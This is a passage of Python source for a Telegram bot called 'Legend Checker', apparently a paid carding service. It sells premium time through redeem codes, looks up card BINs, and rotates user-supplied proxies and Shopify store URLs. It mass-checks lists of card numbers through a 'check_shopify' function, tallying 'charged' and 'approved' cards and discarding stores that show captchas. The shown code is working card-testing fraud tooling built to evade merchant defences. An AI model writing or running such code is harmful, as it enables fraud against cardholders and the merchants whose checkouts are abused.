        generated_codes = []
        
        for _ in range(quantity):
            code = generate_code(duration_str)
            codes[code] = {
                'minutes': total_minutes,
                'duration_display': duration_str,
                'used_by': None
            }
            generated_codes.append(code)
        
        save_codes(codes)
        
        # Format response
        codes_list = '\n'.join([f"<code>{code}</code>" for code in generated_codes])
        
        msg = f"""✅ <b>Generated {quantity} Code(s)</b>

<b>Duration:</b> {duration_str}
<b>Minutes:</b> {total_minutes}

<b>Codes:</b>
{codes_list}

Users can redeem with: /redeem &lt;code&gt;"""
        
        bot.reply_to(message, msg, parse_mode='HTML')
        
    except ValueError:
        bot.reply_to(message, "❌ Quantity must be a valid number!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['broadcast'])
def broadcast_command(message):
    """Broadcast message to all users"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    try:
        parts = message.text.split(maxsplit=1)
        if len(parts) < 2:
            bot.reply_to(message, """❌ Usage: /broadcast &lt;message&gt;

<b>Example:</b>
/broadcast Hello everyone! Bot is updated with new features.

This will send the message to all users who have used the bot.""", parse_mode='HTML')
            return
        
        broadcast_msg = parts[1]
        
        # Get all users who have checked cards
        status = load_status()
        users = load_users()
        
        # Combine users from status and users data
        all_user_ids = set(status.get('users_checked', []))
        all_user_ids.update(users.keys())
        
        if not all_user_ids:
            bot.reply_to(message, "❌ No users found to broadcast!")
            return
        
        # Send broadcast
        sent_count = 0
        failed_count = 0
        
        status_msg = bot.reply_to(message, f"📡 Broadcasting to {len(all_user_ids)} users...", parse_mode='HTML')
        
        for user_id in all_user_ids:
            try:
                bot.send_message(
                    int(user_id),
                    f"📢 <b>Broadcast from Admin:</b>\n\n{broadcast_msg}",
                    parse_mode='HTML'
                )
                sent_count += 1
            except Exception as e:
                failed_count += 1
                # User might have blocked the bot or deleted account
                continue
        
        # Update status
        result_msg = f"""✅ <b>Broadcast Complete!</b>

📊 <b>Statistics:</b>
• Total Users: {len(all_user_ids)}
• ✅ Sent: {sent_count}
• ❌ Failed: {failed_count}

<b>Message:</b>
{broadcast_msg}"""
        
        bot.edit_message_text(
            result_msg,
            chat_id=message.chat.id,
            message_id=status_msg.message_id,
            parse_mode='HTML'
        )
        
    except Exception as e:
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error broadcasting: {safe_error}")

@bot.message_handler(commands=['gid'])
def get_group_id_command(message):
    """Get group ID - works in groups only"""
    try:
        if message.chat.type == 'private':
            bot.reply_to(message, "❌ This command only works in groups!\n\nUse this command in a group to get its ID.")
            return
        
        group_id = message.chat.id
        group_name = message.chat.title or "Unknown Group"
        
        msg = f"""📋 <b>Group Information</b>

<b>Group Name:</b> {html.escape(group_name)}
<b>Group ID:</b> <code>{group_id}</code>

<b>Authorization Status:</b> {"✅ Authorized" if is_group_authorized(group_id) else "❌ Not Authorized"}

To authorize this group, owner should use:
<code>/ag {group_id}</code>"""
        
        bot.reply_to(message, msg, parse_mode='HTML')
        
    except Exception as e:
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error: {safe_error}")

@bot.message_handler(commands=['ag'])
def authorize_group_command(message):
    """Authorize a group to use the bot - owner only"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, """❌ Usage: /ag &lt;group_id&gt;

<b>Example:</b>
/ag -1001234567890

Use /gid in the group to get its ID.""", parse_mode='HTML')
            return
        
        group_id = int(parts[1])
        
        global authorized_groups
        if group_id in authorized_groups:
            bot.reply_to(message, f"⚠️ Group <code>{group_id}</code> is already authorized!", parse_mode='HTML')
            return
        
        authorized_groups.append(group_id)
        
        msg = f"""✅ <b>Group Authorized Successfully!</b>

<b>Group ID:</b> <code>{group_id}</code>

This group can now use all bot commands."""
        
        bot.reply_to(message, msg, parse_mode='HTML')
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid group ID! Must be a number.")
    except Exception as e:
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error: {safe_error}")

@bot.message_handler(commands=['bg'])
def ban_group_command(message):
    """Ban/Remove authorization from a group - owner only"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, """❌ Usage: /bg &lt;group_id&gt;

<b>Example:</b>
/bg -1001234567890

This will remove authorization from the group.""", parse_mode='HTML')
            return
        
        group_id = int(parts[1])
        
        global authorized_groups
        if group_id not in authorized_groups:
            bot.reply_to(message, f"⚠️ Group <code>{group_id}</code> is not authorized!", parse_mode='HTML')
            return
        
        authorized_groups.remove(group_id)
        
        msg = f"""✅ <b>Group Authorization Removed!</b>

<b>Group ID:</b> <code>{group_id}</code>

This group can no longer use bot commands."""
        
        bot.reply_to(message, msg, parse_mode='HTML')
        
    except ValueError:
        bot.reply_to(message, "❌ Invalid group ID! Must be a number.")
    except Exception as e:
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error: {safe_error}")

@bot.message_handler(commands=['deactive'])
def deactivate_user_command(message):
    """Deactivate user premium - owner only"""
    if message.from_user.id != OWNER_ID:
        bot.reply_to(message, "❌ Only owner can use this command!")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, """❌ Usage: /deactive &lt;user_id&gt;

<b>Example:</b>
/deactive 123456789

This will remove premium status from the user.""", parse_mode='HTML')
            return
        
        target_user_id = parts[1].strip()
        
        users = load_users()
        
        if target_user_id not in users:
            bot.reply_to(message, f"❌ User <code>{target_user_id}</code> not found in database!", parse_mode='HTML')
            return
        
        # Remove premium status
        if target_user_id in users:
            # Set premium to expired
            users[target_user_id]['premium_until'] = datetime.now().isoformat()
            save_users(users)
            
            msg = f"""✅ <b>User Deactivated Successfully!</b>

<b>User ID:</b> <code>{target_user_id}</code>

Premium access has been removed from this user."""
            
            bot.reply_to(message, msg, parse_mode='HTML')
            
            # Try to notify the user
            try:
                bot.send_message(
                    int(target_user_id),
                    "⚠️ <b>Your premium access has been deactivated by the owner.</b>\n\nContact owner for more information.",
                    parse_mode='HTML'
                )
            except:
                pass  # User might have blocked the bot
        
    except Exception as e:
        safe_error = html.escape(str(e))
        bot.reply_to(message, f"❌ Error: {safe_error}")

@bot.message_handler(commands=['redeem'])
def redeem_code_command(message):
    """Redeem a code to activate premium"""
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, """❌ Usage: /redeem &lt;code&gt;

<b>Example:</b>
/redeem LEGEND-ABC-XYZ-123-3HRS

Get codes from bot owner!""", parse_mode='HTML')
            return
        
        code = parts[1].strip().upper()
        user_id = str(message.from_user.id)
        
        codes = load_codes()
        
        if code not in codes:
            bot.reply_to(message, "❌ Invalid code!")
            return
        
        if codes[code]['used_by'] is not None:
            bot.reply_to(message, "❌ Code already used!")
            return
        
        # Get code duration
        minutes = codes[code]['minutes']
        duration_display = codes[code]['duration_display']
        
        # Mark code as used
        codes[code]['used_by'] = user_id
        save_codes(codes)
        
        # Activate user premium
        users = load_users()
        current_time = datetime.now()
        
        if user_id in users and 'premium_until' in users[user_id]:
            # Extend existing premium
            try:
                premium_until = datetime.fromisoformat(users[user_id]['premium_until'])
                if premium_until > current_time:
                    # Extend from current expiry
                    new_expiry = premium_until + timedelta(minutes=minutes)
                else:
                    # Expired, start from now
                    new_expiry = current_time + timedelta(minutes=minutes)
            except:
                new_expiry = current_time + timedelta(minutes=minutes)
        else:
            # New premium user
            new_expiry = current_time + timedelta(minutes=minutes)
            if user_id not in users:
                users[user_id] = {}
        
        users[user_id]['premium_until'] = new_expiry.isoformat()
        save_users(users)
        
        msg = f"""✅ <b>Code Redeemed Successfully!</b>

<b>Duration:</b> {duration_display}
<b>Premium Until:</b> {new_expiry.strftime('%Y-%m-%d %H:%M:%S')}

Enjoy your premium access! 🎉"""
        
        bot.reply_to(message, msg, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['info'])
def info_command(message):
    """Show user's account information"""
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    user_id = str(message.from_user.id)
    user_status = get_user_status(message.from_user.id)
    
    # Get username
    username = message.from_user.username
    username_text = f"@{username}" if username else "Not Set"
    
    # Get proxy and site counts
    user_proxies = get_user_proxy(user_id)
    user_sites = get_user_sites(user_id)
    proxy_count = len(user_proxies) if user_proxies else 0
    site_count = len(user_sites) if user_sites else 0
    
    if user_status == 'owner':
        status_emoji = '👑'
        status_text = 'OWNER'
        expiry_text = 'Lifetime Access'
    elif user_status == 'premium':
        status_emoji = '💎'
        status_text = 'PREMIUM'
        users = load_users()
        if user_id in users and 'premium_until' in users[user_id]:
            try:
                premium_until = datetime.fromisoformat(users[user_id]['premium_until'])
                expiry_text = premium_until.strftime('%Y-%m-%d %H:%M:%S')
            except:
                expiry_text = 'Unknown'
        else:
            expiry_text = 'Unknown'
    else:
        status_emoji = '⚡'
        status_text = 'FREE USER'
        expiry_text = 'Not Activated'
    
    msg = f"""<b>📱 USER INFORMATION</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>👤 Name:</b> {message.from_user.first_name}
<b>📝 Username:</b> {username_text}
<b>🆔 User ID:</b> <code>{message.from_user.id}</code>
<b>{status_emoji} Plan:</b> {status_text}
<b>⏰ Expires:</b> {expiry_text}

<b>🌐 Proxies:</b> {proxy_count}
<b>🛒 Sites:</b> {site_count}

━━━━━━━━━━━━━━━━━━━━━━

<b>🎁 Get Premium:</b>
• Contact owner for redeem codes
• Use /redeem &lt;code&gt; to activate"""
    
    bot.reply_to(message, msg, parse_mode='HTML')

@bot.message_handler(commands=['ping'])
def ping_command(message):
    """Check bot response time - available for all users"""
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    import time
    start = time.time()
    sent_msg = bot.reply_to(message, "🏓 Pinging...")
    end = time.time()
    response_time = round((end - start) * 1000, 2)
    
    bot.edit_message_text(
        f"""<b>🏓 PONG!</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>⚡ Response Time:</b> {response_time}ms
<b>🟢 Status:</b> Online
<b>🤖 Bot:</b> Legend Checker

━━━━━━━━━━━━━━━━━━━━━━""",
        chat_id=message.chat.id,
        message_id=sent_msg.message_id,
        parse_mode='HTML'
    )

@bot.message_handler(commands=['bin'])
def bin_lookup_command(message):
    """Lookup BIN information"""
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, """❌ Usage: /bin &lt;bin_number&gt;

<b>Example:</b>
/bin 484783
/bin 556677

Provide 6-8 digit BIN number""", parse_mode='HTML')
            return
        
        bin_number = parts[1].strip()[:8]
        
        if not bin_number.isdigit() or len(bin_number) < 6:
            bot.reply_to(message, "❌ Invalid BIN! Provide 6-8 digits.")
            return
        
        sent_msg = bot.reply_to(message, "🔍 Looking up BIN...")
        
        # Fetch BIN data from API
        response = requests.get(f"https://bins.antipublic.cc/bins/{bin_number}", timeout=10)
        
        if response.status_code != 200:
            bot.edit_message_text(
                f"❌ BIN lookup failed! (Status: {response.status_code})",
                chat_id=message.chat.id,
                message_id=sent_msg.message_id
            )
            return
        
        data = response.json()
        
        # Extract and format data
        brand = data.get('brand', 'N/A').upper()
        card_type = data.get('type', 'N/A').upper()
        level = data.get('level', 'N/A').upper()
        bank = data.get('bank', 'N/A').upper()
        country_name = data.get('country_name', 'N/A').upper()
        country_flag = data.get('country_flag', '')
        
        msg = f"""<b>💳 BIN LOOKUP RESULT</b>

━━━━━━━━━━━━━━━━━━━━━━

<b>🔢 BIN:</b> <code>{bin_number}</code>

<b>💎 Brand:</b> {brand}
<b>📇 Type:</b> {card_type}
<b>⭐ Level:</b> {level}
<b>🏛 Bank:</b> {bank}
<b>🌍 Country:</b> {country_name} {country_flag}

━━━━━━━━━━━━━━━━━━━━━━

<b>🤖 Bot:</b> Legend Checker"""
        
        bot.edit_message_text(
            msg,
            chat_id=message.chat.id,
            message_id=sent_msg.message_id,
            parse_mode='HTML'
        )
        
    except requests.exceptions.Timeout:
        bot.reply_to(message, "❌ Request timeout! Try again.")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['setproxy'])
def set_proxy_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /setproxy ip:port or /setproxy user:pass@ip:port\n\nMultiple: /setproxy ip:port ip2:port2\nWith auth: /setproxy user:pass@ip:port")
            return
        
        proxy_input = parts[1].strip()
        new_proxies = proxy_input.split()
        
        proxies_data = load_user_proxies()
        current_proxies = proxies_data.get(user_id, [])
        
        # Validate format - accept ip:port or user:pass@ip:port or ip:port:user:pass
        valid_proxies = []
        for proxy in new_proxies:
            # Check if format is valid (ip:port, user:pass@ip:port, or ip:port:user:pass)
            if '@' in proxy or proxy.count(':') in [1, 3]:
                valid_proxies.append(proxy)
            else:
                bot.reply_to(message, f"❌ Invalid proxy format!\n\n<b>Supported formats:</b>\n• <code>ip:port</code>\n• <code>user:pass@ip:port</code>\n• <code>ip:port:user:pass</code>\n\n<b>You provided:</b> <code>{proxy}</code>", parse_mode='HTML')
                return
        
        # Check if owner (no limit) or regular user (50 limit)
        user_status = get_user_status(message.from_user.id)
        max_proxies = float('inf') if user_status == 'owner' else 50
        
        if user_status != 'owner' and len(current_proxies) + len(valid_proxies) > max_proxies:
            bot.reply_to(message, f"❌ Proxy limit exceeded! Max {int(max_proxies)} proxies allowed.\nCurrent: {len(current_proxies)}, Trying to add: {len(valid_proxies)}")
            return
        
        # Test each proxy
        testing_msg = bot.reply_to(message, "⏳ Testing proxies, please wait...")
        
        live_proxies = []
        dead_proxies = []
        proxy_details = []
        
        for i, proxy in enumerate(valid_proxies, 1):
            test_result = test_proxy(proxy)
            
            if test_result['status'] == 'live':
                live_proxies.append(proxy)
                # Extract IP for display
                if '@' in proxy:
                    ip_part = proxy.split('@')[1].split(':')[0]
                else:
                    ip_part = proxy.split(':')[0]
                proxy_details.append({
                    'proxy': ip_part + ':' + proxy.split(':')[-1] if '@' not in proxy else proxy.split('@')[1],
                    'ms': test_result['ms'],
                    'status': 'working'
                })
            else:
                dead_proxies.append(proxy)
                if '@' in proxy:
                    ip_part = proxy.split('@')[1].split(':')[0]
                else:
                    ip_part = proxy.split(':')[0]
                proxy_details.append({
                    'proxy': ip_part + ':' + proxy.split(':')[-1] if '@' not in proxy else proxy.split('@')[1],
                    'ms': 0,
                    'status': 'failed'
                })
        
        total_tested = len(valid_proxies)
        working_count = len(live_proxies)
        failed_count = len(dead_proxies)
        success_rate = (working_count / total_tested * 100) if total_tested > 0 else 0
        
        # Build result message in requested format
        results_msg = "📊 𝗣𝗿𝗼𝘅𝘆 added\n\n"
        results_msg += f"🔢 𝗧𝗼𝘁𝗮𝗹 : {total_tested}\n"
        results_msg += f"✅ 𝗪𝗼𝗿𝗸𝗶𝗻𝗴 : {working_count}\n"
        results_msg += f"❌ 𝗙𝗮𝗶𝗹𝗲𝗱 : {failed_count}\n"
        results_msg += f"📈 𝗦𝘂𝗰𝗰𝗲𝘀𝘀 𝗥𝗮𝘁𝗲 : {success_rate:.1f}%\n\n"
        results_msg += "📜 𝗗𝗲𝘁𝗮𝗶𝗹𝘀:\n"
        
        for detail in proxy_details:
            if detail['status'] == 'working':
                results_msg += f"✅ {detail['proxy']} — {detail['ms']:.2f} ms \n"
            else:
                results_msg += f"❌ {detail['proxy']} — Failed\n"
        
        # Only add live proxies
        if live_proxies:
            current_proxies.extend(live_proxies)
            proxies_data[user_id] = current_proxies
            save_user_proxies(proxies_data)
            
            global _user_proxy_cycles
            if user_id in _user_proxy_cycles:
                del _user_proxy_cycles[user_id]
        
        bot.edit_message_text(results_msg, chat_id=message.chat.id, message_id=testing_msg.message_id, parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['rmp'])
def remove_proxy_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /rmp <line_number>\n\nExample: /rmp 1\nMultiple: /rmp 1 2 3\n\nUse /sproxy to see line numbers")
            return
        
        proxies_data = load_user_proxies()
        current_proxies = proxies_data.get(user_id, [])
        
        if not current_proxies:
            bot.reply_to(message, "❌ No proxies to remove!")
            return
        
        line_numbers = parts[1].strip().split()
        indices_to_remove = []
        
        for num in line_numbers:
            try:
                idx = int(num) - 1
                if 0 <= idx < len(current_proxies):
                    indices_to_remove.append(idx)
                else:
                    bot.reply_to(message, f"❌ Invalid line number: {num}")
                    return
            except ValueError:
                bot.reply_to(message, f"❌ Invalid number: {num}")
                return
        
        indices_to_remove.sort(reverse=True)
        removed = []
        for idx in indices_to_remove:
            removed.append(current_proxies.pop(idx))
        
        proxies_data[user_id] = current_proxies
        save_user_proxies(proxies_data)
        
        global _user_proxy_cycles
        if user_id in _user_proxy_cycles:
            del _user_proxy_cycles[user_id]
        
        bot.reply_to(message, f"✅ Removed {len(removed)} proxy(s)!\n\nRemaining: {len(current_proxies)}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['sproxy'])
def show_proxies_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        proxies_data = load_user_proxies()
        current_proxies = proxies_data.get(user_id, [])
        
        if not current_proxies:
            bot.reply_to(message, "❌ No proxies added!\n\nUse /setproxy to add proxies")
            return
        
        proxy_list = "\n".join([f"{i+1}. {proxy}" for i, proxy in enumerate(current_proxies)])
        user_status = get_user_status(message.from_user.id)
        max_display = "∞" if user_status == 'owner' else "50"
        msg = f"<b>Your Proxies ({len(current_proxies)}/{max_display}):</b>\n\n<code>{proxy_list}</code>"
        
        bot.reply_to(message, msg, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['showp'])
def show_proxies_with_ping_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        proxies_data = load_user_proxies()
        current_proxies = proxies_data.get(user_id, [])
        
        if not current_proxies:
            bot.reply_to(message, "❌ No proxies added!\n\nUse /setproxy to add proxies")
            return
        
        # Show testing message
        testing_msg = bot.reply_to(message, "⏳ Testing proxies, please wait...")
        
        # Test each proxy and get ping/ms
        proxy_results = []
        for i, proxy in enumerate(current_proxies, 1):
            test_result = test_proxy(proxy)
            
            # Extract IP for display
            if '@' in proxy:
                display_proxy = proxy.split('@')[1]
            else:
                display_proxy = proxy
            
            if test_result['status'] == 'live':
                proxy_results.append(f"{i}. {display_proxy} - ✅ {test_result['ms']}ms")
            else:
                proxy_results.append(f"{i}. {display_proxy} - ❌ Dead")
        
        # Build result message
        user_status = get_user_status(message.from_user.id)
        max_display = "∞" if user_status == 'owner' else "50"
        proxy_list = "\n".join(proxy_results)
        msg = f"<b>📊 Your Proxies ({len(current_proxies)}/{max_display}):</b>\n\n<code>{proxy_list}</code>"
        
        bot.edit_message_text(msg, chat_id=message.chat.id, message_id=testing_msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['delproxy'])
def delete_all_proxies_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        proxies_data = load_user_proxies()
        
        if user_id not in proxies_data or not proxies_data[user_id]:
            bot.reply_to(message, "❌ No proxies to delete!")
            return
        
        count = len(proxies_data[user_id])
        proxies_data[user_id] = []
        save_user_proxies(proxies_data)
        
        global _user_proxy_cycles
        if user_id in _user_proxy_cycles:
            del _user_proxy_cycles[user_id]
        
        bot.reply_to(message, f"✅ Deleted all {count} proxy(s) successfully!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['addsite'])
def add_site_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /addsite https://example.com\n\nMultiple: /addsite https://site1.com https://site2.com")
            return
        
        site_input = parts[1].strip()
        new_sites = site_input.split()
        
        sites_data = load_sites()
        current_sites = sites_data.get(user_id, [])
        
        # Automatically add https:// if not present
        formatted_sites = []
        for site in new_sites:
            # Remove any http:// or https:// first, then add https://
            site = site.replace('http://', '').replace('https://', '')
            formatted_sites.append(f'https://{site}')
        
        new_sites = formatted_sites
        
        # Check if owner (no limit) or regular user (50 limit)
        user_status = get_user_status(message.from_user.id)
        max_sites = float('inf') if user_status == 'owner' else 50
        
        if user_status != 'owner' and len(current_sites) + len(new_sites) > max_sites:
            bot.reply_to(message, f"❌ Site limit exceeded! Max {int(max_sites)} sites allowed.\nCurrent: {len(current_sites)}, Trying to add: {len(new_sites)}")
            return
        
        # Test sites by checking response - only add if valid
        testing_msg = bot.reply_to(message, "⏳ Checking sites, please wait...")
        
        valid_sites = []
        valid_sites_details = []
        invalid_sites = []
        test_cc = "5108690130220518|05|2029|278"  # Test card
        
        for site in new_sites:
            try:
                # Get user's first proxy or None
                user_proxies = get_user_proxy(user_id)
                test_proxy = user_proxies[0] if user_proxies else None
                
                # Check site with test card
                result = check_shopify(test_cc, site, test_proxy)
                response_lower = result.get('response', '').lower()
                response_text = result.get('response', 'Unknown')
                gateway = result.get('gateway', 'Shopify')
                price = result.get('price', 'NA')
                
                # Valid responses that indicate site is working
                valid_keywords = ['card decline', 'fraud suspected', '3d authentication', 'declined', 'insufficient']
                
                if any(keyword in response_lower for keyword in valid_keywords):
                    # Remove https:// for cleaner display
                    clean_site = site.replace('https://', '')
                    valid_sites.append(site)
                    valid_sites_details.append({
                        'site': clean_site,
                        'price': price,
                        'gateway': gateway,
                        'response': response_text
                    })
                else:
                    clean_site = site.replace('https://', '')
                    invalid_sites.append(f"• {clean_site} - Response: {response_text}")
            except Exception as e:
                clean_site = site.replace('https://', '')
                invalid_sites.append(f"• {clean_site} - Error: {str(e)}")
        
        # Build response message with styling
        result_msg = ""
        
        if valid_sites:
            current_sites.extend(valid_sites)
            sites_data[user_id] = current_sites
            save_sites(sites_data)
            
            global _user_cycles
            if user_id in _user_cycles:
                del _user_cycles[user_id]
            
            max_display = "∞" if user_status == 'owner' else "50"
            
            # Stylish success message
            result_msg = "<b>✅ 𝗬𝗼𝘂𝗿 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆</b>\n\n"
            result_msg += f"<b>📝 𝑾𝒐𝒓𝒌𝒊𝒏𝒈 𝑺𝒊𝒕𝒆𝒔</b>\n"
            result_msg += "────────────────\n"
            
            for detail in valid_sites_details:
                result_msg += f"✅ <code>{detail['site']}</code>\n"
                result_msg += f"   ⤷ 💲{detail['price']} ┃ {detail['gateway']} ┃ {detail['response']}\n"
            
            result_msg += f"\n<b>📊 Total:</b> {len(current_sites)}/{max_display} sites"
        
        if invalid_sites:
            if result_msg:
                result_msg += "\n\n"
            result_msg += f"<b>❌ 𝑹𝒆𝒋𝒆𝒄𝒕𝒆𝒅 𝑺𝒊𝒕𝒆𝒔</b>\n"
            result_msg += "────────────────\n"
            for invalid in invalid_sites[:5]:  # Show max 5
                result_msg += f"{invalid}\n"
        
        if not valid_sites and not invalid_sites:
            result_msg = "❌ No sites were processed!"
        
        bot.edit_message_text(result_msg, chat_id=message.chat.id, message_id=testing_msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['rms'])
def remove_site_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /rms <line_number>\n\nExample: /rms 1\nMultiple: /rms 1 2 3\n\nUse /showsite to see line numbers")
            return
        
        sites_data = load_sites()
        current_sites = sites_data.get(user_id, [])
        
        if not current_sites:
            bot.reply_to(message, "❌ No sites to remove!")
            return
        
        line_numbers = parts[1].strip().split()
        indices_to_remove = []
        
        for num in line_numbers:
            try:
                idx = int(num) - 1
                if 0 <= idx < len(current_sites):
                    indices_to_remove.append(idx)
                else:
                    bot.reply_to(message, f"❌ Invalid line number: {num}")
                    return
            except ValueError:
                bot.reply_to(message, f"❌ Invalid number: {num}")
                return
        
        indices_to_remove.sort(reverse=True)
        removed = []
        for idx in indices_to_remove:
            removed.append(current_sites.pop(idx))
        
        sites_data[user_id] = current_sites
        save_sites(sites_data)
        
        global _user_cycles
        if user_id in _user_cycles:
            del _user_cycles[user_id]
        
        bot.reply_to(message, f"✅ Removed {len(removed)} site(s)!\n\nRemaining: {len(current_sites)}")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['showsite'])
def show_sites_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        sites_data = load_sites()
        current_sites = sites_data.get(user_id, [])
        
        if not current_sites:
            bot.reply_to(message, "❌ No sites added!\n\nUse /addsite to add sites")
            return
        
        # Get user's proxies
        user_proxies = get_user_proxy(user_id)
        proxy_count = len(user_proxies) if user_proxies else 0
        
        # Show checking message
        checking_msg = bot.reply_to(message, "⏳ Checking sites, please wait...")
        
        # Test each site and get response
        site_results = []
        test_cc = "4532015112830366|12|2028|123"  # Test card
        
        for i, site in enumerate(current_sites, 1):
            try:
                # Get first proxy or None
                test_proxy = user_proxies[0] if user_proxies else None
                
                # Check site
                result = check_shopify(test_cc, site, test_proxy)
                response = result.get('response', 'Unknown')
                status = result.get('status', 'Error')
                
                # Format status emoji
                if status == 'Approved':
                    status_emoji = '✅'
                elif status == 'Declined':
                    status_emoji = '❌'
                else:
                    status_emoji = '⚠️'
                
                site_results.append(f"{i}. {site}\n   {status_emoji} {response[:50]}...")
            except Exception as e:
                site_results.append(f"{i}. {site}\n   ⚠️ Error: {str(e)[:50]}...")
        
        # Build result message
        user_status = get_user_status(message.from_user.id)
        max_display = "∞" if user_status == 'owner' else "50"
        
        site_list = "\n\n".join(site_results)
        msg = f"<b>📊 Your Sites ({len(current_sites)}/{max_display}):</b>\n\n"
        msg += f"<b>Proxies Added:</b> {proxy_count}\n\n"
        msg += f"<code>{site_list}</code>"
        
        bot.edit_message_text(msg, chat_id=message.chat.id, message_id=checking_msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['delsites'])
def delete_all_sites_command(message):
    # Check group authorization
    if not check_group_authorization(message):
        return
    
    try:
        user_id = str(message.from_user.id)
        sites_data = load_sites()
        
        if user_id not in sites_data or not sites_data[user_id]:
            bot.reply_to(message, "❌ No sites to delete!")
            return
        
        count = len(sites_data[user_id])
        sites_data[user_id] = []
        save_sites(sites_data)
        
        global _user_cycles
        if user_id in _user_cycles:
            del _user_cycles[user_id]
        
        bot.reply_to(message, f"✅ Deleted all {count} site(s) successfully!")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")


def run_tsh_thread(message, card_lines, total_cards, ko):
    """Background thread for text shopify checking"""
    user_id = str(message.from_user.id)
    try:
        # Initialize counters and lists for saving
        charged_count = 0
        approved_count = 0
        declined_count = 0
        error_count = 0
        
        # Lists to store approved and charged cards
        approved_cards_list = []
        charged_cards_list = []
        
        # Get user info for check format
        user_name = message.from_user.first_name or "Unknown"
        user_status = get_user_status(message.from_user.id)
        
        results = []
        start_time = time.time()
        
        for i, card in enumerate(card_lines):
            # Check if user requested stop
            with stop_flags_lock:
                should_stop = stop_flags.get(user_id, False)
            
            if should_stop:
                # Send termination message
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=ko,
                    text=f"""<b>TEXT SHOPIFY STOPPED</b>

• Checked: {i}/{total_cards} cards
• ᴄʜᴀʀɢᴇ 💎: {charged_count}
• ᴀᴘᴘʀᴏᴠᴇ ❎: {approved_count}
• ᴅᴇᴄʟɪɴᴇᴅ ❌: {declined_count}
• ᴇʀʀᴏʀ ⚠️: {error_count}

<i>Process terminated by user.</i>""",
                    parse_mode="HTML"
                )
                # Clean up
                with active_checks_lock:
                    if user_id in active_mass_checks:
                        del active_mass_checks[user_id]
                with stop_flags_lock:
                    if user_id in stop_flags:
                        del stop_flags[user_id]
                return
            
            # Update progress
            with active_checks_lock:
                if user_id in active_mass_checks:
                    active_mass_checks[user_id]['current'] = i
            
            cc = str(reg(card))
            
            if cc == 'None':
                error_count += 1
            else:
                # Use site and proxy rotation for checking
                selected_site = get_next_site(message.from_user.id)
                if not selected_site:
                    user_sites = get_user_sites(user_id)
                    selected_site = user_sites[0] if user_sites else None
                
                if not selected_site:
                    error_count += 1
                    continue
                
                check_start_time = time.time()
                # Get user's proxy with rotation
                proxy = get_next_proxy(user_id=message.from_user.id)
                result = check_shopify(cc, selected_site, proxy=proxy)
                end_time = time.time()
                time_taken = f"{end_time - check_start_time:.2f}"
                
                response_lower = result['response'].lower()
                
                # Check for hcaptcha and remove site if detected
                if 'hcaptcha' in response_lower or 'captcha' in response_lower:
                    sites_data = load_sites()
                    user_sites = sites_data.get(user_id, [])
